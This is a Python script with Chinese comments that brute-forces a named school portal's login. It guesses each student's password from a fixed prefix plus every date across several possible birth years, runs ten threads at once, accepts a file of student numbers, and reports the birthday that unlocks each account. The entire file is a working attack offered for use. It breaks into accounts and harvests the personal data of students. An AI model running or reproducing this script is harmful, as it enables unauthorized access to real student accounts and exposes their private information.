import sys
import requests
import datetime
import logging
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from typing import List, Generator, Optional, Tuple
from dataclasses import dataclass

# 配置常量
@dataclass
class AppConfig:
    LOGIN_URL: str = "http://portal.kcisec.com/login/Account/LogInCheck"
    PASSWORD_TEMPLATE: str = "Kskq%{}"
    SEARCH_ORDER: Tuple[int, ...] = (7, 8, 6, 9)  # 使用不可变元组
    DEFAULT_INPUT_FILE: str = "login.txt"
    MAX_WORKERS: int = 10
    TIMEOUT: int = 10
    RETRIES: int = 3
    LOGIN_SUCCESS_KEYS: Tuple[str, ...] = ("login_ok", "Account/ShowPage")

config = AppConfig()

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)

class BirthdayFinder:
    def __init__(self):
        self.results = []
    
    @staticmethod
    def create_session() -> requests.Session:
        """创建预配置的请求会话"""
        session = requests.Session()
        retry_strategy = HTTPAdapter(
            max_retries=config.RETRIES,
            pool_connections=config.MAX_WORKERS,
            pool_maxsize=config.MAX_WORKERS
        )
        session.mount("http://", retry_strategy)
        session.mount("https://", retry_strategy)
        return session

    def login(self, username: str, password: str, session: requests.Session) -> bool:
        """执行登录验证"""
        params = {
            "UserId": username,
            "Password": password,
            "Mode": "tuberculosis",
        }
        
        try:
            with session.get(
                config.LOGIN_URL, 
                params=params, 
                timeout=config.TIMEOUT
            ) as response:
                response.raise_for_status()
                return any(key in response.text for key in config.LOGIN_SUCCESS_KEYS)
        except requests.exceptions.RequestException as e:
            logging.error(f"登录失败 [{username}]: {str(e)}", exc_info=True)
            return False

    @staticmethod
    def validate_student_number(username: str) -> bool:
        """验证学号有效性"""
        if len(username) < 5:
            logging.warning(f"无效学号 [{username}]: 长度不足五位")
            return False
        try:
            int(username[:2])
            return True
        except ValueError:
            logging.warning(f"无效学号 [{username}]: 前两位非数字")
            return False

    @staticmethod
    def generate_dates(start_year: int) -> Generator[datetime.datetime, None, None]:
        """生成日期范围迭代器"""
        start_date = datetime.datetime(start_year, 9, 1)
        end_date = datetime.datetime(start_year + 1, 9, 1)
        delta = datetime.timedelta(days=1)
        
        current_date = start_date
        while current_date < end_date:
            yield current_date
            current_date += delta

    def find_birthday(self, username: str) -> str:
        """主查询函数"""
        if not self.validate_student_number(username):
            return "无效学号"

        prefix = int(username[:2])
        session = self.create_session()

        for grade_offset in config.SEARCH_ORDER:
            base_year = prefix - grade_offset + 2000
            logging.debug(f"尝试 [{username}] 年级偏移: {grade_offset} (基年: {base_year})")
            
            for current_date in self.generate_dates(base_year):
                password = config.PASSWORD_TEMPLATE.format(current_date.strftime("%Y%m%d"))
                if self.login(username, password, session):
                    found_date = current_date.strftime('%Y%m%d')
                    logging.info(f"成功匹配 [{username}]: {found_date}")
                    return found_date
        
        logging.warning(f"未找到生日 [{username}]")
        return "未找到生日"

    def process_students(self, student_numbers: List[str]) -> None:
        """处理学号列表并保持顺序"""
        with ThreadPoolExecutor(max_workers=config.MAX_WORKERS) as executor:
            self.results = list(executor.map(self.find_birthday, student_numbers))

def get_student_numbers() -> Optional[List[str]]:
    """获取学号输入"""
    choice = input("请选择输入方式：\n1. 手动输入\n2. 文件输入\n请输入选项：").strip()
    
    if choice == "1":
        if sn := input("请输入学号：").strip():
            return [sn]
        raise ValueError("输入无效")
    
    elif choice == "2":
        file_path = input(f"输入文件路径（默认{config.DEFAULT_INPUT_FILE}）：").strip() or config.DEFAULT_INPUT_FILE
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                return [line.strip() for line in f if line.strip()]
        except IOError as e:
            logging.error(f"文件操作失败: {file_path}", exc_info=True)
            raise
    
    raise ValueError("无效选项")

def main() -> None:
    """主程序入口"""
    try:
        student_numbers = get_student_numbers()
        if not student_numbers:
            logging.warning("无有效学号")
            return

        finder = BirthdayFinder()
        finder.process_students(student_numbers)
        
        # 修改后的输出部分：只输出结果，保持原顺序
        print("\n查询结果：")
        print("\n".join(finder.results))
        
    except Exception as e:
        logging.error("程序运行出错", exc_info=True)
        sys.exit(1)

if __name__ == "__main__":
    main()